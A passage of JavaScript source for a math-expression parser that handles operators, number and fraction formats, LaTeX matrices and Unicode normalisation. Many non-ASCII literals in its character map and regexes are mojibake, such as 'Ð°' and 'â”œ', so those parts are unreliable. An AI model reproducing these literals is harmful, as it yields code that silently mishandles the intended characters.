    new Operator("max", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, function (a) {
      return a.max();
    }),
    new Operator("gcd", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, function (a) {
      return a.gcd();
    }),

    new Operator("conjugate", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, function (a) {
      return a.complexConjugate();
    }),
    new Operator("overline", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, function (a) {
      return a.complexConjugate();
    }),

    new Operator("\\left", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, function (a) {
      return a;
    }),
    new Operator("\\right", 1, LEFT_TO_RIGHT, UNARY_PRECEDENCE_PLUS_ONE, function (a) {
      return a;
    }),
    new Operator("â”œ", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, function (a) { // like \\left
      return a;
    }),
    new Operator("â”¤", 1, LEFT_TO_RIGHT, UNARY_PRECEDENCE_PLUS_ONE, function (a) { // like \\right
      return a;
    }),

    new Operator("frac", 2, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, function (a, b) {
      return a.divide(b);
    }),

    new Operator("!", 1, LEFT_TO_RIGHT, UNARY_PRECEDENCE, function (a) {
      return a.factorial();
    }),
    new Operator("!!", 1, LEFT_TO_RIGHT, UNARY_PRECEDENCE, notSupported), // to not parse 3!! as (3!)!, see https://en.wikipedia.org/wiki/Double_factorial
    new Operator("!!!", 1, LEFT_TO_RIGHT, UNARY_PRECEDENCE, notSupported)
  ];

  function OperationSearchCache() {
    this.map = {};
    this.re = null;
  }

  OperationSearchCache.prototype.append = function (operator) {
    this.map[operator.name.toLowerCase()] = operator;
    this.re = null;
  };
  OperationSearchCache.prototype.getByName = function (name) {
    return this.map[name.toLowerCase()];
  };
  OperationSearchCache.prototype.getRegExp = function () {
    // https://stackoverflow.com/questions/3561493/is-there-a-regexp-escape-function-in-javascript
    var escapeRegExp = function (s) {
      // "-" is not escaped
      return s.replace(/[\/\\^$*+?.()|[\]{}]/g, '\\$&');
    };
    // longest: ? "^T" and "^"
    // ignore case
    if (this.re == null) {//TODO: ?
      var names = [];
      for (var name in this.map) {
        if (Object.prototype.hasOwnProperty.call(this.map, name)) {
          names.push(name);
        }
      }
      names.sort(function (a, b) {
        // longest is lesser then shortest when one of strings is a prefix of another
        return a < b && b.lastIndexOf(a, 0) !== 0 || a.lastIndexOf(b, 0) === 0 ? -1 : +1;
      });
      var separator = String.fromCharCode(0xE0000);
      this.re = new RegExp('^(?:' + escapeRegExp(names.join(separator)).split(separator).join('|').replace(/\|ch\|/g, '|ch(?!i)|').replace(/\|th\|/g, '|th(?!eta)|') + ')', 'i');
    }
    return this.re;
  };

  var operationSearchCache = new OperationSearchCache();
  var trigonometryFunctions = {};

  var i = -1;
  while (++i < operations.length) {
    operationSearchCache.append(operations[i]);
  }
  for (var iteratorname = 'cos sin tan cot'.split(' ')[globalThis.Symbol.iterator](), name = iteratorname.next().value; name != null; name = iteratorname.next().value) {
    operationSearchCache.append(Operator.trigonometry(name));
    trigonometryFunctions[name] = true;
  }
  for (var iteratorname = 'cosh sinh tanh coth arccos arcsin arctan arccot arcosh arsinh artanh arcoth'.split(' ')[globalThis.Symbol.iterator](), name = iteratorname.next().value; name != null; name = iteratorname.next().value) {
    operationSearchCache.append(Operator.simple(name));
  }

  var nextToken = function (tokenizer) {
    var token = null;
    do {
      token = tokenizer.next();
    } while (token.type === 'whitespace');
    return token;
  };

  var parsePunctuator = function (tokenizer, token, punctuator) {
    if (token.type !== 'punctuator' || token.value !== punctuator) {
      ExpressionParser.startPosition = tokenizer.previousPosition;
      ExpressionParser.endPosition = tokenizer.position;
      ExpressionParser.input = tokenizer.input;
      if (token.type === 'EOF') {
        throw new RangeError("UserError: unexpected end of input, '" + punctuator + "' expected");
      }
      throw new RangeError("UserError: unexpected '" + tokenizer.input.slice(tokenizer.previousPosition, tokenizer.position) + "', '" + punctuator + "' expected");
    }
    token = nextToken(tokenizer);
    return token;
  };

  function ParseResult(result, token) {
    this.result = result;
    this.token = token;
  }

  var parseMatrix = function (tokenizer, token, context) {
    var openingBracket = "{";
    var closingBracket = "}";

    var rows = [];
    var hasNextRow = true;
    while (hasNextRow) {
      token = parsePunctuator(tokenizer, token, openingBracket);
      var row = [];
      var hasNextCell = true;
      while (hasNextCell) {
        var tmp = parseExpression(tokenizer, token, context, COMMA_PRECEDENCE, undefined);
        token = tmp.token;
        row.push(tmp.result);
        if (token.type === 'punctuator' && token.value === ",") {
          hasNextCell = true;
          token = nextToken(tokenizer);
        } else {
          hasNextCell = false;
        }
      }
      token = parsePunctuator(tokenizer, token, closingBracket);
      rows.push(row);
      if (token.type === 'punctuator' && token.value === ",") {
        hasNextRow = true;
        token = nextToken(tokenizer);
      } else {
        hasNextRow = false;
      }
    }
    token = parsePunctuator(tokenizer, token, "}");
    return new ParseResult(context.wrap(Expression.Matrix.fromArray(rows)), token);
  };

  var parseLaTeXMatrix = function (tokenizer, token, context, rowSeparator) {
    var rows = [];
    var firstRow = true;
    while (firstRow || (token.type === 'punctuator' && token.value === rowSeparator)) {
      if (firstRow) {
        firstRow = false;
      } else {
        token = nextToken(tokenizer);
      }
      var row = [];
      var firstCell = true;
      while (firstCell || token.type === 'punctuator' && token.value === "&") {
        if (firstCell) {
          firstCell = false;
        } else {
          token = nextToken(tokenizer);
        }
        var tmp = parseExpression(tokenizer, token, context, COMMA_PRECEDENCE, undefined);
        token = tmp.token;
        row.push(tmp.result);
      }
      rows.push(row);
    }
    return new ParseResult(context.wrap(Expression.Matrix.fromArray(rows)), token);
  };

  var parseLaTeXArgument = function (tokenizer, token, context) {
    return parseExpression(tokenizer, token, context, 0, undefined);
  };

  var getVulgarFraction = function (vulgarFraction) {
    var input = normalizeVulgarFractions(vulgarFraction).replace(/[\u2044]/g, "/");
    var e = Expression.Integer.fromString(input.slice(0, input.indexOf('/'))).divide(Expression.Integer.fromString(input.slice(input.indexOf('/') + '/'.length)));
    return e;
  };

  var getDecimalFraction = function (integerPart, nonRepeatingFractionalPart, repeatingFractionalPart, exponentPart) {
    var numerator = Expression.ZERO;
    var denominator = Expression.ONE;

    if (integerPart != undefined) {
      numerator = Expression.Integer.fromString(integerPart);
    }
    if (nonRepeatingFractionalPart != undefined) {
      var factor = Expression.pow(Expression.TEN, nonRepeatingFractionalPart.length);
      numerator = numerator.multiply(factor).add(Expression.Integer.fromString(nonRepeatingFractionalPart));
      denominator = denominator.multiply(factor);
    }
    if (repeatingFractionalPart != undefined) {
      var factor = Expression.pow(Expression.TEN, repeatingFractionalPart.length).subtract(Expression.ONE);
      numerator = numerator.multiply(factor).add(Expression.Integer.fromString(repeatingFractionalPart));
      denominator = denominator.multiply(factor);
    }
    if (exponentPart != undefined) {
      var exponent = 0 + Number(exponentPart);
      var factor = Expression.pow(Expression.TEN, exponent < 0 ? -exponent : exponent);
      if (exponent < 0) {
        denominator = denominator.multiply(factor);
      } else {
        numerator = numerator.multiply(factor);
      }
    }

    var value = numerator.divide(denominator);
    return value;
  };
  ExpressionParser._getDecimalFraction = getDecimalFraction;

  var parseDecimalFraction = function (tokenizer, token, context) {
    var isOnlyInteger = true;
    var result = undefined;
    if (token.type === 'integerLiteral') {
      result = Expression.Integer.fromString(token.value);
      result = context.wrap(result);
      token = nextToken(tokenizer);
    } else if (token.type === 'numericLiteral') {
      var value = token.value;
      //var match = token.match;
      var match = decimalFractionWithGroups.exec(value);
      isOnlyInteger = false;
      if (!context.needsWrap) {
        result = getDecimalFraction(match[1], match[2], match[3], match[4]);
      } else {
        result = new Expression.DecimalFraction(match[1], match[2], match[3], match[4]);
      }
      result = context.wrap(result);
      token = nextToken(tokenizer);
    }
    //!
    if (isOnlyInteger || result == undefined) {
      if (token.type === 'vulgarFraction') {
        var fraction = context.wrap(getVulgarFraction(token.value, context));
        if (result != undefined) {
          result = result.add(fraction).addPosition(tokenizer.previousPosition, tokenizer.previousPosition, tokenizer.input);
        } else {
          result = fraction;
        }
        token = nextToken(tokenizer);
      }
    }
    return result != undefined ? new ParseResult(result, token) : undefined;
  };

  // TODO: sticky flags - /\s+/y
  var whiteSpaces = /^\s+/;
  var punctuators = /^(?:[,&(){}|â– @]|\\\\|(?:\\begin|\\end)(?:\{[bvp]?matrix\})?)/;
  var integerLiteral = /^\d+(?![\d.])(?![eEÐ•]|Ø§Ø³)(?!,(?:\d|\(\d+\)))/; // for performance
  var integerLiteralWithoutComma = /^\d+(?![\d.])(?![eEÐ•]|Ø§Ø³)/; // for performance
  var decimalFraction = /^(?=[.,]?\d)\d*(?:(?:[.]|[.,](?=\d|\(\d+\)))\d*(?:\(\d+\))?)?(?:(?:[eEÐ•]|Ø§Ø³)[\+\-]?\d+)?/;
  var decimalFractionWithoutComma = new RegExp(decimalFraction.source.replace(/,/g, ''));
  // Base Latin, Base Latin upper case, Base Cyrillic, Base Cyrillic upper case, Greek alphabet
  // + https://en.wikipedia.org/wiki/Modern_Arabic_mathematical_notation#Mathematical_letters
  var greek = "alpha beta gamma delta epsilon zeta eta theta iota kappa lambda mu nu xi omicron pi rho varsigma sigma tau upsilon phi chi psi omega".split(" ");
  var ARABIC_MATHEMATIC_LETTER = /(?:[\u0627\u066E\u062D\u062F\u0633\u0634\u0635\u0639\u0637\u06BE\u062A]|\u062d\u0640\u0640\u0640\u0640)(?![\u0600-\u06FF])/;
  var symbols = new RegExp(/^(?:GREEK|circ|âˆž|[a-zA-ZÐ°-ÑÐ-Ð¯Î±-Ï‰ÃŸ]|ARABIC_MATHEMATIC_LETTER)(?:\_[0-9]+|\_\([a-z0-9]+,[a-z0-9]+\)|[\u2080-\u2089]+)?/.source.replace(/GREEK/g, greek.join('|')).replace(/ARABIC_MATHEMATIC_LETTER/g, ARABIC_MATHEMATIC_LETTER.source));
  var superscripts = /^[\u00B2\u00B3\u00B9\u2070\u2071\u2074-\u207F]+/; // superscript characters "2310i456789+âˆ’=()n"
  var vulgarFractions = /^[\u00BC-\u00BE\u2150-\u215E]/;
  //var other = /^\S/u;
  var other = /^(?:[\uD800-\uDBFF][\uDC00-\uDFFF]|\S)/; // should not split surrogate pairs (for Tokenizer and other things)

  var decimalFractionWithGroups = /^(\d+)?(?:[.,](\d+)?(?:\((\d+)\))?)?(?:(?:[eEÐ•]|Ø§Ø³)([\+\-]?\d+))?$/;

  // s.normalize("NFKD")
  var normalizeSuperscripts = function (s) {
    return s.replace(/[\u00B2\u00B3\u00B9\u2070\u2071\u2074-\u207F]/g, function (c) {
      var charCode = c.charCodeAt(0);
      if (charCode === 0x00B2) {
        return "2";
      }
      if (charCode === 0x00B3) {
        return "3";
      }
      if (charCode === 0x00B9) {
        return "1";
      }
      var i = charCode - 0x2070;
      return "0i  456789+-=()n".slice(i, i + 1);
    });
  };

  // s.normalize("NFKD")
  var normalizeVulgarFractions = function (s) {
    return s.replace(/[\u00BC-\u00BE\u2150-\u215E]/g, function (c) {
      var charCode = c.charCodeAt(0);
      var i = charCode - 0x2150 < 0 ? (charCode - 0x00BC) * 2 : (3 + charCode - 0x2150) * 2;
      return "141234171911132315253545165618385878".slice(i, i + 2).replace(/^\S/g, "$&\u2044").replace(/1\u20441/g, "1\u204410");
    });
  };

  var normalizeSubscripts = function (s) {
    var i = s.length - 1;
    while (i >= 0 && s.charCodeAt(i) >= 0x2080 && s.charCodeAt(i) <= 0x2089) {
      i -= 1;
    }
    return i === s.length - 1 ? s : s.slice(0, i + 1) + "_" + s.slice(i + 1).replace(/[\u2080-\u2089]/g, function (c) {
      return String.fromCharCode(c.charCodeAt(0) - 0x2080 + "0".charCodeAt(0));
    });
  };

  var normalizeGreek = function (s) {
    var i = s.indexOf("_");
    var k = i === -1 ? s.length : i;
    if (k > 1) {
      var name = s.slice(0, k);
      var j = greek.indexOf(name);
      if (j !== -1) {
        return String.fromCharCode(0x03B1 + j) + s.slice(k);
      }
    }
    return s;
  };

  var parseExpression = function (tokenizer, token, context, precedence, left) {
    var ok = true;
    var isDecimalFraction = false;
    var tmp = undefined;
    var right = undefined;
    //!

    while (token.type !== 'EOF' && ok) {
      var op = undefined;
      var operand = undefined;

        var bestMatch = token.type === 'operator' || (token.type === 'punctuator' && token.value === ',') ? operationSearchCache.getByName(token.value) : null;
        if (bestMatch != null) {
          op = left == null && bestMatch.name === '+' ? UNARY_PLUS : (left == null && bestMatch.name === '-' ? UNARY_MINUS : bestMatch);
        }
        //  if (Input.startsWith(input, position, '\\begin') || Input.startsWith(input, position, '\\end')) {
        //    op = null;
        //  }

      //if (op != null && op.name === "\\" && Input.startsWith(input, position, "\\\\")) {
      //  if (isMatrixElement) {//TODO: optimize
      //    op = null;
        //} else if (Input.startsWith(input, position + 1, "begin") || Input.startsWith(input, position + 1, "left")) {
        //  op = null;
      //  }
      //}

      if (op != null && op.name === "frac") { // !isAlpha(Input.getFirst(input, position + "frac".length))
        if (!(left == null && precedence <= UNARY_PRECEDENCE_PLUS_ONE || precedence < MULTIPLICATIVE_PRECEDENCE)) {
          ok = false;
        } else {
        // https://en.wikipedia.org/wiki/Operand#Positioning_of_operands - prefix notation

        token = nextToken(tokenizer);
        tmp = parseExpression(tokenizer, token, context, MULTIPLICATIVE_PRECEDENCE, undefined);
        var a = tmp.result;
        token = tmp.token;
        tmp = parseExpression(tokenizer, token, context, MULTIPLICATIVE_PRECEDENCE, undefined);
        var b = tmp.result;
        token = tmp.token;
        // addPosition - ?
        operand = op.i(a, b);
        ok = true;
        }
      } else if (op != undefined) {
        // TODO: check if the checks are needed (tests - ?)
        if (!(left != undefined && (op.arity !== 1 || op.rightToLeftAssociative !== RIGHT_TO_LEFT || precedence < MULTIPLICATIVE_PRECEDENCE) ||
              left == undefined && op.arity === 1 && op.rightToLeftAssociative === RIGHT_TO_LEFT) ||
            //!(!candidate.xyz || !isAlpha(Input.getFirst(input, position + candidate.name.length))) ||//TODO: fix - ExpressionParser.parse("George")
            precedence > op.precedence + (op.rightToLeftAssociative === RIGHT_TO_LEFT ? 0 : -1)) {
          ok = false;
        } else {
          var operatorPosition = tokenizer.previousPosition;
          token = nextToken(tokenizer);
          if (op.arity === 1 && op.rightToLeftAssociative !== RIGHT_TO_LEFT) {
            //TODO: fix
            ExpressionParser.startPosition = operatorPosition;
            ExpressionParser.endPosition = operatorPosition + op.name.length;
            ExpressionParser.input = tokenizer.input;
            left = op.i(left).addPosition(operatorPosition, op.name.length, tokenizer.input);
          } else {
            if (op.arity === 1 && op.rightToLeftAssociative === RIGHT_TO_LEFT && op.precedence === UNARY_PRECEDENCE_PLUS_ONE && op.name.length > 1 &&
                trigonometryFunctions[op.name] === true &&
                (token.type === 'operator' && token.value === '^' || token.type === 'superscript' && /^\d+$/.test(normalizeSuperscripts(token.value)))) {
              // https://en.wikipedia.org/wiki/Exponentiation#Exponential_notation_for_function_names

              // cos^2(x)
              //!new 2017-11-04
              // parse an operator for the exponentiation
              var exponentiationPosition = tokenizer.position;

              var exponentiationLength = 0;
              var middle = null;
              if (token.type === 'superscript') {
                middle = Expression.Integer.fromString(normalizeSuperscripts(token.value));
                exponentiationLength = tokenizer.position - tokenizer.previousPosition;
                token = nextToken(tokenizer);
              } else {
                exponentiationLength = '^'.length;
                token = nextToken(tokenizer);
                if (token.type !== 'integerLiteral') {
                  ok = false;
                } else {
                  tmp = parseExpression(tokenizer, token, context, UNARY_PRECEDENCE, undefined);
                  middle = tmp.result;
                  token = tmp.token;
                }
              }
              if (ok) {
                // parse an operator for the current operator
                tmp = parseExpression(tokenizer, token, context, op.precedence, undefined);
                right = tmp.result;
                token = tmp.token;
                operand = op.i(right).addPosition(operatorPosition, op.name.length, tokenizer.input).pow(middle).addPosition(exponentiationPosition, exponentiationLength, tokenizer.input);
              }
            } else {
              tmp = parseExpression(tokenizer, token, context, op.precedence, undefined);
              right = tmp.result;
              token = tmp.token;
              //TODO: fix `1/(2-2)`
              ExpressionParser.startPosition = operatorPosition;
              ExpressionParser.endPosition = operatorPosition + op.name.length;
              ExpressionParser.input = tokenizer.input;
              if (op.arity === 1) {
                // left <implicit multiplication> operand
                operand = op.i(right).addPosition(operatorPosition, op.name.length, tokenizer.input);
              } else if (op.arity === 2) {
                left = op.i(left, right).addPosition(operatorPosition, op.name.length, tokenizer.input);
              } else {
                throw new RangeError();
              }
            }
          }
        }
      } else if (left == undefined || precedence < MULTIPLICATIVE_PRECEDENCE || (precedence === UNARY_PRECEDENCE_PLUS_ONE && isDecimalFraction && token.type === 'symbol')) {
        if ((tmp = parseDecimalFraction(tokenizer, token, context)) != undefined) {
          operand = tmp.result;
          token = tmp.token;
          isDecimalFraction = true;
        } else if (token.type === 'punctuator' && token.value === "(") {
          token = parsePunctuator(tokenizer, token, "(");
          tmp = parseExpression(tokenizer, token, context, 0, undefined);
          operand = tmp.result;
          token = tmp.token;
          token = parsePunctuator(tokenizer, token, ")");
        } else if (token.type === 'punctuator' && token.value === "{") {
          token = parsePunctuator(tokenizer, token, "{");
          if (token.type === 'punctuator' && token.value === "{") {
            tmp = parseMatrix(tokenizer, token, context);
            operand = tmp.result;
            token = tmp.token;
          } else {
            tmp = parseLaTeXArgument(tokenizer, token, context);
            operand = tmp.result;
            token = tmp.token;
            token = parsePunctuator(tokenizer, token, "}");
          }
        } else if (token.type === 'punctuator' && (token.value === "\\begin{bmatrix}" ||
                                                   token.value === "\\begin{vmatrix}" ||
                                                   token.value === "\\begin{pmatrix}" ||
                                                   token.value === "\\begin{matrix}")) {
          var kind = token.value.slice('\\begin{'.length, -1);
          token = nextToken(tokenizer);
          tmp = parseLaTeXMatrix(tokenizer, token, context, '\\\\');
          operand = tmp.result;
          token = tmp.token;
          if (token.type === 'punctuator' && token.value === "\\end{" + kind + "}") {
            token = nextToken(tokenizer);
          }
          if (kind === 'vmatrix') {
            operand = operand.determinant();//!
          }
        } else if (token.type === 'symbol') {
          var symbolName = token.value;
          symbolName = normalizeSubscripts(symbolName);
          symbolName = normalizeGreek(symbolName);
          operand = context.get(symbolName);
          operand = context.wrap(operand);
          token = nextToken(tokenizer);
        } else if (token.type === 'punctuator' && token.value === "|") {
          if (left == undefined || Expression.isScalar(left) && precedence < COMMA_PRECEDENCE) {//!
            token = parsePunctuator(tokenizer, token, "|");
            tmp = parseExpression(tokenizer, token, context, COMMA_PRECEDENCE, undefined);
            operand = tmp.result;
            token = tmp.token;
            token = parsePunctuator(tokenizer, token, "|");
            if (Expression.isScalar(operand)) {//TODO: !?
              operand = operand.abs();
            } else {
              operand = operand.determinant();//!
            }
          } else if (precedence < COMMA_PRECEDENCE) {
            //TODO: fix
            token = parsePunctuator(tokenizer, token, "|");
            tmp = parseExpression(tokenizer, token, context, 0, undefined);
            operand = tmp.result;
            token = tmp.token;
            operand = left.augment(operand);
            left = undefined;
          } else {
            ok = false;
          }
        } else if (token.type === 'punctuator' && token.value === 'â– ') {
          token = nextToken(tokenizer);
          token = parsePunctuator(tokenizer, token, '(');
          tmp = parseLaTeXMatrix(tokenizer, token, context, '@');
          operand = tmp.result;
          token = tmp.token;
          token = parsePunctuator(tokenizer, token, ')');
        } else {
          ok = false;
        }
      } else {
        ok = false;
      }

      //!TODO: fix
      if (!ok && left != undefined && precedence <= UNARY_PRECEDENCE + (RIGHT_TO_LEFT === RIGHT_TO_LEFT ? 0 : -1)) {
        if (token.type === 'superscript') {
          // implicit exponentiation
          //TODO: check position
          var x = ExpressionParser.parse(normalizeSuperscripts(token.value), context);//?
          left = left.pow(x).addPosition(tokenizer.previousPosition, tokenizer.previousPosition, tokenizer.input);
          token = nextToken(tokenizer);
          ok = true;//!
        }
      }

      if (!ok && token.type === 'operator' && token.value === "\\") { // isAlpha(Input.getFirst(input, position + 1))
        // TODO: LaTeX - ?
        ok = true;
        token = nextToken(tokenizer);
      }

      if (operand != undefined) {
        if (left != undefined) {
          // implied multiplication
          var oldPosition = tokenizer.position;
          tmp = parseExpression(tokenizer, token, context, MULTIPLICATIVE_PRECEDENCE, operand);
          var right1 = tmp.result;
          token = tmp.token;
          left = left.multiply(right1).addPosition(oldPosition, "*".length, tokenizer.input);
        } else {
          left = operand;
        }
      }
    }

    if (left == undefined) {
      ExpressionParser.startPosition = tokenizer.previousPosition;
      ExpressionParser.endPosition = tokenizer.position;
      ExpressionParser.input = tokenizer.input;
      if (token.type === 'EOF') {
        throw new RangeError("UserError: unexpected end of input");//TODO: fix
      }
      //TODO: ?
      throw new RangeError("UserError: unexpected '" + tokenizer.input.slice(tokenizer.previousPosition, tokenizer.position) + "'");//TODO: fix
    }
    return new ParseResult(left, token);
  };

  var decimalNumberRegExp = new RegExp('\\p{Decimal_Number}', 'u');
  var replaceSimpleDigit = function (codePoint) {
    var i = 0;
    while (decimalNumberRegExp.test(String.fromCodePoint(codePoint - i))) {
      i += 1;
    }
    return i === 0 ? -1 : (i - 1) % 10;
  };
  
  var map = {
    ":": "/",
    "[": "(",
    "]": ")",
    "Â·": "*",
    "Ã—": "*",
    "Ã·": "/",
    "Ë†": "^",
    "Ï•": "Ï†",
    "Ð": "A",
    "Ð’": "B",
    "Ð¡": "C",
    "Ð¢": "T",
    "Ð°": "A",
    "Ð²": "B",
    "Ñ": "C",
    "Ñ‚": "T",
    "ØŒ": ",",
    "Ù«": ",",
    "\u200B": " ",
    "â€": "-",
    "â€‘": "-",
    "â€’": "-",
    "â€“": "-",
    "â€”": "-",
    "â€•": "-",
    "â€¢": "*",
    "\u2061": " ",
    "\u2062": "*",
    "\u2063": ",",
    "\u2064": " ",
    "â…‡": "e",
    "â…ˆ": "i",
    "âˆ’": "-",
    "âˆ•": "/",
    "âˆ™": "*",
    "â‰¤": "â©½",
    "â‰¥": "â©¾",
    "â‹…": "*",
    "â”‚": "|",
    "â–ˆ": "â– ",
    "âœ“": "âˆš",
    "ã€‡": "0",
    "ã€–": "(",
    "ã€—": ")",
    "ãƒ¼": "-",
    "ä¸€": "1",
    "ä¸ƒ": "7",
    "ä¸‰": "3",
    "ä¹": "9",
    "äºŒ": "2",
    "äº”": "5",
    "å…«": "8",
    "å…­": "6",
    "å››": "4"
  };


    //if (charCode === "Ð¥".charCodeAt(0)) {
    //  return "X";
    //}
    //if (charCode === "Ñ…".charCodeAt(0)) {
    //  return "X";
    //}
    // 0x003A - Deutsch
    // "\u2064" is replaced by " ", not "+", as "+" has smaller priority
    // "Ï•".normalize("NFKD") === "Ï†"
    //if (/\p{Cf}/u.test(String.fromCodePoint(codePoint))) {
    //  return " ".charCodeAt(0);
    //}
    // hanidec digits

  var isBidiControl = function (codePoint) {
    // /\p{Bidi_Control}/u.test(String.fromCodePoint(codePoint))
    return codePoint === 0x061C ||
           codePoint === 0x200E ||
           codePoint === 0x200F ||
           codePoint >= 0x202A && codePoint <= 0x202E ||
           codePoint >= 0x2066 && codePoint <= 0x2069;
  };

  var getCodePointReplacement = function (codePoint) {
    if (codePoint >= 0xFF01 && codePoint <= 0xFF5E) {
      // normalize full-width forms:
      return codePoint - 0xFF01 + 0x0021;
    }
    var digit = replaceSimpleDigit(codePoint);
    if (digit !== -1) {
      return digit + "0".charCodeAt(0);
    }
    if (isBidiControl(codePoint)) {
      return " ".charCodeAt(0);
    }
    if (codePoint >= 0x0000 && codePoint <= 0xFFFF) {
      // today map contains only BMP characters in keys and values
      var replacement = map[String.fromCharCode(codePoint)];
      if (replacement != undefined && replacement.length === 1) {
        return replacement.charCodeAt(0);
      }
    }
    return -1;
  };

  //input = input.replace(replaceRegExp, replaceFunction); - slow in Chrome
  var replaceSomeChars = function (input) {
    var lastIndex = 0;
    var result = '';
    var i = 0;
    while (i < input.length) {
      var codePoint = input.codePointAt(i);
      var width = codePoint <= 0xFFFF ? 1 : 2;
      if (codePoint > 0x007F || codePoint === 0x003A || codePoint === 0x005B || codePoint === 0x005D) {
        var x = getCodePointReplacement(codePoint);
        if (x !== -1) {
          if (!(x >= 0x0000 && x <= 0xFFFF)) {
            throw new RangeError(); // assertion
          }
          result += input.slice(lastIndex, i);
          result += String.fromCharCode(x);
          lastIndex = i + width;
        }
      }
      i += width;
    }
    result += input.slice(lastIndex);
    return result;
  };

  var config = [
    {type: 'integerLiteral', re: null},
    {type: 'numericLiteral', re: null},
    {type: 'whitespace', re: whiteSpaces},
    {type: 'punctuator', re: punctuators},
    {type: 'operator', re: null},
    {type: 'symbol', re: symbols},
    {type: 'vulgarFraction', re: vulgarFractions},
    {type: 'superscript', re: superscripts},
    {type: 'OTHER', re: other}
  ];

  function Token(type, value) {
    this.type = type;
    this.value = value;
  }

  Token.EOF = new Token('EOF', '');

  function Tokenizer(input, position, states) {
    this._preparedInput = replaceSomeChars(input.slice(position)); //TODO: fix ???
    this.input = input;
    this._preparedInputPosition = 0;
    this.previousPosition = position;
    this.position = position;
    this.states = states;
  }

  Tokenizer.prototype.next = function () {
    this.previousPosition = this.position;
    if (this.position >= this.input.length) {
      return Token.EOF;
    }
    // iteration by object keys is slower (?)
    for (var i = 0; i < config.length; i += 1) {
      var c = config[i];
      var type = c.type;
      var re = c.re;
      if (re == null) {
        if (type === 'integerLiteral') {
          if (this.states != null && this.states.value === '{}') {
            re = integerLiteralWithoutComma;
          } else {
            re = integerLiteral;
          }
        } else if (type === 'numericLiteral') {
          if (this.states != null && this.states.value === '{}') {
            re = decimalFractionWithoutComma;
          } else {
            re = decimalFraction;
          }
        } else if (type === 'operator') {
          re = operationSearchCache.getRegExp();//?TODO:
        }
      }
      var tmp = re.exec(this._preparedInput.slice(this._preparedInputPosition));
      if (tmp != null) {
        var value = tmp[0];
        if (type === 'punctuator') {
          if (value === '(') {
            this.states = {previous: this.states, value: '()'};
          } else if (value === ')') {
            if (this.states != null && this.states.value === '()') {
              this.states = this.states.previous;
            }
          } else if (value === '{') {
            this.states = {previous: this.states, value: '{}'};
          } else if (value === '}') {
            if (this.states != null && this.states.value === '{}') {
              this.states = this.states.previous;
            }
          }
        }
        for (var j = 0; j < value.length; j += (value.codePointAt(j) <= 0xFFFF ? 1 : 2)) {
          this.position += this.input.codePointAt(this.position) <= 0xFFFF ? 1 : 2;
        }
        this._preparedInputPosition += value.length;
        return new Token(type, value);
      }
    }
    throw new TypeError();
  };

  var fs = {};//!TODO: remove!!!

  function ExpressionParser() {
  }

  ExpressionParser.parse = function (input, context) {
    context = context == undefined ? new ExpressionParser.Context(undefined, false) : context;

    ExpressionParser.startPosition = -1;
    ExpressionParser.endPosition = -1;
    ExpressionParser.input = input; //?

    // TODO: remove
    if (typeof input !== "string") {
      throw new RangeError();
    }

    if (typeof hit === "function" && context.getter != undefined) {
      var re = /[a-z][a-z][a-z\-]+/gi;
      var m = null;
      while ((m = re.exec(input)) != null) {
        var t = m[0];
        if (!(t in fs) && t.indexOf("-") === -1) {
          fs[t] = true;
          hit({fs: t});
        }
      }
    }

    var tokenizer = new Tokenizer(input, 0, null);
    var token = nextToken(tokenizer);
    var tmp = parseExpression(tokenizer, token, context, 0, undefined);
    token = tmp.token;
    if (token.type !== 'EOF') {
      ExpressionParser.startPosition = tokenizer.previousPosition;
      ExpressionParser.endPosition = tokenizer.position;
      ExpressionParser.input = tokenizer.input;
      throw new RangeError("UserError: unexpected '" + tokenizer.input.slice(tokenizer.previousPosition, tokenizer.position) + "'");
    }

    return tmp.result;
  };

  globalThis.Tokenizer = Tokenizer;

  ExpressionParser.startPosition = -1;
  ExpressionParser.endPosition = -1;
  ExpressionParser.input = "";

  var getConstant = function (symbolName) {
    if (symbolName === "pi" || symbolName === "\u03C0" || symbolName === "\u0637") {
      return Expression.PI;
    }
    if (symbolName === "e" || symbolName === "\u06BE") {
      return Expression.E;
    }
    if (symbolName === "i" || symbolName === "\u062A") {
      return Expression.I;
    }
    if (symbolName === "I" || symbolName === "U" || symbolName === "E") {
      return new Expression.IdentityMatrix(symbolName);
    }
    if (symbolName === "circ") { //TODO: â—‹ - ?
      return Expression.CIRCLE;
    }
    if (symbolName === "âˆž") {
      return Expression.INFINITY;
    }
    return new Expression.Symbol(symbolName);
  };

  ExpressionParser.Context = function (getter, needsWrap) {
    this.getter = getter;
    this.needsWrap = needsWrap == undefined ? true : needsWrap;
  };
  ExpressionParser.Context.prototype.get = function (symbolName) {
    if (this.getter != undefined) {
      var x = this.getter(symbolName);
      if (x != undefined) {
        return x;
      }
    }
    return getConstant(symbolName);
  };
  ExpressionParser.Context.prototype.wrap = function (e) {
    if (!this.needsWrap) {
      return e;
    }
    return new Expression.NonSimplifiedExpression(e);
  };

  ExpressionParser.addOperation = function (denotation, arity) {
    //TODO: UNARY_PRECEDENCE -> UNARY_PRECEDENCE_PLUS_ONE - ???
    var newOperation = arity === 1 ? new Operator(denotation, arity, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (a) {
      return a.transformNoAnswerExpression(denotation);
    }) : new Operator(denotation, arity, RIGHT_TO_LEFT, MULTIPLICATIVE_PRECEDENCE, function (a, b) {
      return a.transformNoAnswerExpression(denotation, b);
    });
    //operations.push(newOperation);
    operationSearchCache.append(newOperation);
  };

  ExpressionParser.addDenotations = function (denotationsByOperation) {
    for (var operationName in denotationsByOperation) {
      if (Object.prototype.hasOwnProperty.call(denotationsByOperation, operationName)) {
        var denotations = denotationsByOperation[operationName];
        var operation = operationSearchCache.getByName(operationName);
        var added = {};
        added[operationName] = true;
        for (var key in denotations) {
          if (Object.prototype.hasOwnProperty.call(denotations, key)) {
            var denotation = denotations[key];
            if (added[denotation] == undefined) {
              added[denotation] = true;
              var newOperation = new Operator(denotation, operation.arity, operation.rightToLeftAssociative, operation.precedence, operation.i);
              //operations.push(newOperation);
              operationSearchCache.append(newOperation);
              if (trigonometryFunctions[operationName]) {
